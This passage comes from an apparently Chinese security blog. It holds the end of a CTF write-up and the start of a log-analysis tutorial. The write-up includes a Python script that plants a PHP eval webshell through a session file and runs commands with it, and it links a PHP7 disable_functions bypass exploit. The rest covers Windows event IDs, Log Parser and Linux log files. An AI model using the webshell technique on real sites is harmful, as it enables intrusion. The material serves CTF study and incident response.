class="string">&quot;password&quot;</span>:<span class="string">&quot;back&quot;</span>&#125;</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=1433223143322314332231433223.php&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>():</span></span><br><span class="line">s.get(url)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>(<span class="params">data</span>):</span></span><br><span class="line">s.post(url+<span class="string">&quot;home/member/register&quot;</span>,data=data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">data</span>):</span></span><br><span class="line">s.post(url+<span class="string">&#x27;home/member/login&#x27;</span>,data=data,headers=headers)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>():</span></span><br><span class="line">data1=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span>&#125;</span><br><span class="line">s.post(url+<span class="string">&#x27;home/member/search&#x27;</span>,data=data1,headers=headers)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">data2=&#123;<span class="string">&quot;1&quot;</span>:<span class="string">&quot;echo &#x27;hacker!&#x27;;&quot;</span>&#125;</span><br><span class="line">r=requests.post(url+<span class="string">&quot;runtime/session/sess_1433223143322314332231433223.php&quot;</span>,data=data2)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;hacker&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(<span class="string">&quot;[+] vulnerable!!!&quot;</span>)</span><br><span class="line">req()</span><br><span class="line">register(data)</span><br><span class="line">login(data)</span><br><span class="line">search()</span><br><span class="line">backdoor()</span><br></pre></td></tr></table></figure><p>然后蚁剑连，发现没法执行系统命令，查看phpinfo()，发现：</p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/TIM截图20200225170417.png" style="zoom:80%;"><p>常规的bypass方法都不能用了，这里有个项目是关于php7 bypass disable_function的：</p><p><a href="https://github.com/mm0r1/exploits/">https://github.com/mm0r1/exploits/</a></p><p>这里用的就是：</p><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="code-in-morse"><a href="#code-in-morse" class="headerlink" title="code_in_morse"></a>code_in_morse</h3><p>文件是流量包，wireshark打开，导出所有http对象发现有个<code>12.jpg</code>，无法显示</p><p>hxd打开发现是摩斯密码，解密的base32，再解密发现就乱码了但能看出来是png文件</p><p>写了个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = open(<span class="string">&#x27;12.jpg&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">s = a.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">dict = &#123;<span class="string">&#x27;.-&#x27;</span>: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-...&#x27;</span>: <span class="string">&#x27;B&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-.&#x27;</span>: <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..&#x27;</span>:<span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.&#x27;</span>:<span class="string">&#x27;E&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-.&#x27;</span>:<span class="string">&#x27;F&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.&#x27;</span>: <span class="string">&#x27;G&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....&#x27;</span>: <span class="string">&#x27;H&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..&#x27;</span>: <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.---&#x27;</span>:<span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.-&#x27;</span>: <span class="string">&#x27;K&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-..&#x27;</span>: <span class="string">&#x27;L&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--&#x27;</span>: <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.&#x27;</span>: <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---&#x27;</span>: <span class="string">&#x27;O&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--.&#x27;</span>: <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--.-&#x27;</span>: <span class="string">&#x27;Q&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-.&#x27;</span>: <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...&#x27;</span>: <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..-&#x27;</span>: <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...-&#x27;</span>: <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.--&#x27;</span>: <span class="string">&#x27;W&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..-&#x27;</span>: <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.--&#x27;</span>: <span class="string">&#x27;Y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--..&#x27;</span>: <span class="string">&#x27;Z&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.----&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..---&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;...--&#x27;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;....-&#x27;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.....&#x27;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-....&#x27;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;--...&#x27;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---..&#x27;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;----.&#x27;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-----&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;..--..&#x27;</span>: <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-..-.&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-.--.-&#x27;</span>: <span class="string">&#x27;()&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-....-&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;.-.-.-&#x27;</span>: <span class="string">&#x27;.&#x27;</span></span><br><span class="line">        &#125;;</span><br><span class="line">tr=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">if</span> item <span class="keyword">in</span> dict:</span><br><span class="line">tr+=dict[item]</span><br><span class="line"><span class="comment"># print(tr)</span></span><br><span class="line"><span class="keyword">if</span> len(tr)%<span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">tr+=<span class="string">&#x27;=&#x27;</span>*(<span class="number">8</span>-len(tr)%<span class="number">8</span>)</span><br><span class="line">de=base64.b32decode(tr.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;1.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">fp.write(de)</span><br><span class="line"><span class="comment"># print(de)</span></span><br></pre></td></tr></table></figure><p>可以直接生成png图片</p><p><img src="/2020/02/21/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9Bgame-gyctf%E9%83%A8%E5%88%86writeup/1.png"></p><p>pdf417解密，解密地址：<a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;s2.ax1x.com&#x2F;2020&#x2F;02&#x2F;06&#x2F;1yPXJ1.jpg</span><br></pre></td></tr></table></figure><p>套娃，下载下来，查看属性发现F5，猜测F5隐写，没想到是没密码的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java Extract 1yPXJ1.jpg</span><br></pre></td></tr></table></figure><p>在<code>output.txt</code>里找到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志分析</title>
      <link href="2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了日志审计的相关内容！</p><a id="more"></a><h2 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h2><h3 id="windows日志分析"><a href="#windows日志分析" class="headerlink" title="windows日志分析"></a>windows日志分析</h3><p>日志记录了系统中硬件、软件和系统问题的信息，同时还监视着系统中发生的事件。当服务器被入侵或者系统（应用）出现问题时，管理员可以根据日志迅速定位问题的关键，再快速处理问题，从而极大地提高工作效率和服务器的安全性。<br>Windows 通过自带事件查看器管理日志，使用命令<code>eventvwr.msc</code>或<code>eventvwr</code>打开</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIM截图20200218215545.png" style="zoom:80%;"><h4 id="Windows-日志位置"><a href="#Windows-日志位置" class="headerlink" title="Windows 日志位置"></a>Windows 日志位置</h4><p><code>Windows 2000/Server2003/Windows XP</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\%SystemRoot%\System32\Config\*.evt</span><br></pre></td></tr></table></figure><p><code>Windows Vista/7/10/Server2008/Sever2016:</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\%SystemRoot%\System32\winevt\Logs\*.evtx</span><br></pre></td></tr></table></figure><p><code>%SystemRoot%</code>为系统环境变量，默认值为<code>C:\WINDOWS</code></p><p><strong>几个重要的事件日志文件说明（Vista/Win7/Win8/Win10/Server2008/Server 2012及之后的版本)：</strong></p><table><thead><tr><th align="center">事件类型</th><th align="left">描述</th><th align="center">文件名</th></tr></thead><tbody><tr><td align="center">系统</td><td align="left">包含系统进程，设备磁盘活动等。事件记录了设备驱动无法正常启动或停止，硬件失败，重复IP地址，系统进程的启动，停止及暂停等行为。</td><td align="center">System.evtx</td></tr><tr><td align="center">安全</td><td align="left">包含安全性相关的事件，如用户权限变更，登录及注销，文件及文件夹访问，打印等信息。</td><td align="center">Security.evtx</td></tr><tr><td align="center">应用程序</td><td align="left">包含操作系统安装的应用程序软件相关的事件。事件包括了错误、警告及任何应用程序需要报告的信息，应用程序开发人员可以决定记录哪些信息。</td><td align="center">Application.evtx</td></tr><tr><td align="center">Microsoft</td><td align="left">Microsoft文件夹下包含了200多个微软内置的事件日志分类，只有部分类型默认启用记录功能，如远程桌面客户端连接、无线网络、有线网路、设备安装等相关日志。</td><td align="center">详见日志存储目录对应文件</td></tr><tr><td align="center">Microsoft Office Alerts</td><td align="left">微软Office应用程序（包括Word/Excel/PowerPoint等）的各种警告信息，其中包含用户对文档操作过程中出现的各种行为，记录有文件名、路径等信息。</td><td align="center">OAerts.evtx</td></tr><tr><td align="center">Windows PowerShell</td><td align="left">Windows自带的PowerShell应用的日志信息。</td><td align="center">Windows PowerShell.evtx</td></tr><tr><td align="center">Internet Explorer</td><td align="left">IE浏览器应用程序的日志信息，默认未启用，需要通过组策略进行配置。</td><td align="center">Internet Explorer.evtx</td></tr></tbody></table><h4 id="事件类型"><a href="#事件类型" class="headerlink" title="事件类型"></a>事件类型</h4><p>Windows事件日志中共有五种事件类型，所有的事件必须拥有五种事件类型中的一种，且只可以有一种。五种事件类型分为：</p><ol><li><p>**信息(Information)**：信息事件指应用程序、驱动程序或服务的成功操作的事件。</p></li><li><p><strong>警告(Warning)：</strong>警告事件指不是直接的、主要的，但是会导致将来问题发生的问题。例如，当磁盘空间不足或未找到打印机时，都会记录一个“警告”事件。</p></li><li><p><strong>错误(Error)：</strong>错误事件指用户应该知道的重要的问题。错误事件通常指功能和数据的丢失。例如,如果一个服务不能作为系统引导被加载，那么它会产生一个错误事件。</p></li><li><p><strong>成功审核(Success audit)：</strong>成功的审核安全访问尝试，主要是指安全性日志，这里记录着用户登录/注销、对象访问、特权使用、账户管理、策略更改、详细跟踪、目录服务访问、账户登录等事件，例如所有的成功登录系统都会被记录为“ 成功审核”事件。</p></li><li><p><strong>失败审核(Failure audit)：</strong>失败的审核安全登录尝试，例如用户试图访问网络驱动器失败，则该尝试会被作为失败审核事件记录下来。</p></li></ol><h4 id="重要事件ID"><a href="#重要事件ID" class="headerlink" title="重要事件ID"></a>重要事件ID</h4><p>Windows事件日志中记录的信息中，关键的要素包含事件级别、记录时间、事件来源、事件ID、事件描述、涉及的用户、计算机、操作代码及任务类别等。其中事件的ID与操作系统的版本有关，以下列举出的事件ID的操纵系统为Vista/Win7/Win8/Win10/Server2008/Server 2012及之后的版本：</p><table><thead><tr><th align="center">事件ID</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">1102</td><td align="center">清理审计日志</td></tr><tr><td align="center">4624</td><td align="center">账号成功登录</td></tr><tr><td align="center">4625</td><td align="center">账号登录失败</td></tr><tr><td align="center">4768</td><td align="center">Kerberos身份验证（TGT请求）</td></tr><tr><td align="center">4769</td><td align="center">Kerberos服务票证请求</td></tr><tr><td align="center">4776</td><td align="center">NTLM身份验证</td></tr><tr><td align="center">4672</td><td align="center">授予特殊权限</td></tr><tr><td align="center">4720</td><td align="center">创建用户</td></tr><tr><td align="center">4726</td><td align="center">删除用户</td></tr><tr><td align="center">4728</td><td align="center">将成员添加到启用安全的全局组中</td></tr><tr><td align="center">4729</td><td align="center">将成员从安全的全局组中移除</td></tr><tr><td align="center">4732</td><td align="center">将成员添加到启用安全的本地组中</td></tr><tr><td align="center">4733</td><td align="center">将成员从启用安全的本地组中移除</td></tr><tr><td align="center">4756</td><td align="center">将成员添加到启用安全的通用组中</td></tr><tr><td align="center">4757</td><td align="center">将成员从启用安全的通用组中移除</td></tr><tr><td align="center">4719</td><td align="center">系统审计策略修改</td></tr></tbody></table><p>五种事件类型中，最为重要的是成功审核（Success Audit），所有系统登录成功都会被标记成为成功审核。每个成功登录的事件都会标记一个登录类型：</p><table><thead><tr><th align="center">登录类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">2</td><td align="center">交互式登录（用户从控制台登录）</td></tr><tr><td align="center">3</td><td align="center">网络（例如：通过net use,访问共享网络）</td></tr><tr><td align="center">4</td><td align="center">批处理（为批处理程序保留）</td></tr><tr><td align="center">5</td><td align="center">服务启动（服务登录）</td></tr><tr><td align="center">6</td><td align="center">不支持</td></tr><tr><td align="center">7</td><td align="center">解锁（带密码保护的屏幕保护程序的无人值班工作站）</td></tr><tr><td align="center">8</td><td align="center">网络明文（IIS服务器登录验证）</td></tr><tr><td align="center">10</td><td align="center">远程交互（终端服务，远程桌面，远程辅助）</td></tr><tr><td align="center">11</td><td align="center">缓存域证书登录</td></tr></tbody></table><p><strong>远程连接日志</strong>（<code>应用程序和服务日志</code>-&gt;<code>Microsoft</code>-&gt;<code>Windows</code>-&gt;-<code>TerminalServices-RemoteConnectionManager</code>-&gt;<code>Operational</code>），重要事件 ID 和含义：</p><ul><li>1149：用户认证成功</li><li>21：远程桌面服务：会话登录成功</li><li>24：远程桌面服务：会话已断开连接</li><li>25：远程桌面服务：会话重新连接成功</li></ul><p><strong>计划任务事件日志</strong>(<code>应用程序和服务日志</code>-&gt;<code>Microsoft</code>-&gt;<code>Windows</code>-&gt;<code>TaskScheduler</code>-&gt;<code>Operational</code>)，计划任务 ID 含义：</p><ul><li>100：任务已开始</li><li>102：任务完成</li><li>106：已注册任务（关注点）</li><li>107：在调度程序上触发任务</li><li>110：用户触发的任务</li><li>129：创建任务流程（推出）</li><li>140：任务已更新</li><li>141：任务已删除</li><li>200：运行计划任务</li><li>325：启动请求排队</li></ul><p>更多详细事件id说明参见微软官方：<a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p><h4 id="工具分析日志"><a href="#工具分析日志" class="headerlink" title="工具分析日志"></a>工具分析日志</h4><h5 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h5><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p><p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>默认会安装到<code>C:\Program Files (x86)\Log Parser 2.2</code>目录下</p><p><strong>基本查询结构</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:xx.evtx&quot;</span><br></pre></td></tr></table></figure><p>使用Log Parser分析日志</p><p>1、查询登录成功的事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:Security.evtx where EventID&#x3D;4624&quot;</span><br><span class="line"></span><br><span class="line">指定登录时间范围的事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:Security.evtx where TimeGenerated&gt;&#39;2020-02-19 23:32:11&#39; and TimeGenerated&lt;&#39;2020-02-20 01:00:00&#39; and EventID&#x3D;4624&quot;</span><br><span class="line"></span><br><span class="line">提取登录成功的用户名和IP：</span><br><span class="line">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#39; &#39;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#39;|&#39;) as Username,EXTRACT_TOKEN(Message,38,&#39; &#39;) as Loginip FROM c:Security.evtx where EventID&#x3D;4624&quot;</span><br></pre></td></tr></table></figure><p>2、查询登录失败的事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">登录失败的所有事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:Security.evtx where EventID&#x3D;4625&quot;</span><br><span class="line"></span><br><span class="line">提取登录失败用户名进行聚合统计：</span><br><span class="line">LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,&#39; &#39;)  as EventType,EXTRACT_TOKEN(Message,19,&#39; &#39;) as user,count(EXTRACT_TOKEN(Message,19,&#39; &#39;)) as Times,EXTRACT_TOKEN(Message,39,&#39; &#39;) as Loginip FROM c:Security.evtx where EventID&#x3D;4625 GROUP BY Message&quot;</span><br></pre></td></tr></table></figure><p>3、系统历史开关机记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM c:System.evtx where EventID&#x3D;6005 or EventID&#x3D;6006&quot;</span><br></pre></td></tr></table></figure><h5 id="Get-WinEvent"><a href="#Get-WinEvent" class="headerlink" title="Get-WinEvent"></a>Get-WinEvent</h5><p>是一个从本地和远程计算机上的<strong>事件日志</strong>和<strong>事件跟踪日志</strong>文件中获取事件的工具</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get-WinEvent帮助命令</span></span><br><span class="line"><span class="built_in">get-help</span> <span class="built_in">Get-WinEvent</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有事件日志</span></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-ListLog</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># powershell管理员权限下获取安全事件日志</span></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-FilterHashtable</span> <span class="selector-tag">@</span>&#123;LogName=<span class="string">&#x27;Security&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤安全事件ID 4624</span></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-FilterHashtable</span> <span class="selector-tag">@</span>&#123;LogName=<span class="string">&#x27;Security&#x27;</span>;ID=<span class="string">&#x27;4624&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询今天的应用和系统日志，显示前2条</span></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="selector-tag">@</span>&#123;logname=<span class="string">&#x27;application&#x27;</span>,<span class="string">&#x27;system&#x27;</span>;starttime=[<span class="built_in">datetime</span>]::today &#125; <span class="literal">-MaxEvents</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据ID查询事件</span></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-LogName</span> Microsoft<span class="literal">-Windows</span><span class="literal">-PowerShell</span>/Operational | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="string">&quot;4100&quot;</span> <span class="operator">-or</span> <span class="variable">$_</span>.ID <span class="operator">-eq</span> <span class="string">&quot;4104&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询指定时间内的事件</span></span><br><span class="line"><span class="variable">$StartTime</span>=<span class="built_in">Get-Date</span>  <span class="literal">-Year</span>  <span class="number">2020</span>  <span class="literal">-Month</span>  <span class="number">2</span>  <span class="literal">-Day</span>  <span class="number">18</span>  <span class="literal">-Hour</span>  <span class="number">23</span>  <span class="literal">-Minute</span>  <span class="number">30</span></span><br><span class="line"><span class="variable">$EndTime</span>=<span class="built_in">Get-Date</span>  <span class="literal">-Year</span>  <span class="number">2020</span>  <span class="literal">-Month</span>  <span class="number">2</span>  <span class="literal">-Day</span>  <span class="number">19</span>  <span class="literal">-Hour</span>  <span class="number">0</span>  <span class="literal">-Minute</span>  <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-WinEvent</span> <span class="literal">-FilterHashtable</span> <span class="selector-tag">@</span>&#123;LogName=<span class="string">&#x27;System&#x27;</span>;StartTime=<span class="variable">$StartTime</span>;EndTime=<span class="variable">$EndTime</span>&#125;</span><br></pre></td></tr></table></figure><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIM截图20200219001249.png" style="zoom: 80%;"><p>详细使用可以参考：<a href="https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Diagnostics/Get-WinEvent?view=powershell-5.1">https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Diagnostics/Get-WinEvent?view=powershell-5.1</a></p><h3 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h3><h4 id="Linux日志位置"><a href="#Linux日志位置" class="headerlink" title="Linux日志位置"></a>Linux日志位置</h4><p>日志默认存放位置：<code>/var/log/*</code></p><p><strong>常见的日志文件：</strong></p><table><thead><tr><th align="center">路径</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/messages</td><td align="center">记录 Linux 内核消息及各种应用程序的公共日志信息</td></tr><tr><td align="center">/var/log/cron</td><td align="center">记录 crond 计划任务产生的事件信息</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">记录 Linux 操作系统在引导过程中的各种事件信息</td></tr><tr><td align="center">/var/log/maillog</td><td align="center">记录进入或发出系统的电子邮件活动</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录每个用户最近的登录事件</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录用户认证相关的安全事件信息</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">记录每个用户登录、注销及系统启动和停机事件</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录失败的、错误的登录尝试及验证事件</td></tr></tbody></table><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIM截图20200219140928.png" style="zoom:80%;"><p>可以看到发行版本差别日志文件可能不尽相同</p><p><strong>Ubuntu日志文件</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;log&#x2F;alternatives.log-更新替代信息都记录在这个文件中</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apport.log -应用程序崩溃记录</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apt&#x2F;  -用apt-get安装卸载软件的信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;auth.log  -登录认证log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;boot.log  -包含系统启动时的日志。</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;btmp    -记录所有失败启动信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;Consolekit  - 记录控制台信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;cpus    - 涉及所有打印信息的日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;dist-upgrade  - dist-upgrade这种更新方式的信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;dmesg    -包含内核缓冲信息（kernel 